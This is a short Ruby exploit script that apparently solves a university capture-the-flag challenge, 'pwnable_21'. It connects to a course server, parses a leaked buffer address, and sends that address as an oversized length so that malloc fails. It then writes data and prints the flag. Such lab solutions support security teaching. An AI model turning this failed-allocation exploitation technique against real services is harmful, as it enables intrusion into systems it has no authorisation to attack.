#!/usr/bin/env ruby
require_relative '../crackme.rb'
executable = "../pwnable_21"

CrackMe.open('tank.informatik.hs-mannheim.de', 3015) do |c|
  c.read_line         # Welcome

  # Get the leak, which is the address of the allocated
  # buffer
  leak = c.read_line
  leak = leak.gsub(/^.*0x/,'')
  puts "Leak: " + leak
  address = Address.parse_hex(leak) + 1

  # Provide the address of the target buffer as length
  # This is far to big for malloc, which will fail with
  # a zero return value.
  c.send_line address.to_i.to_s

  # Write any data, not relevant.
  c.send_line "1"

  # Print flag
  puts c.get_flag
end
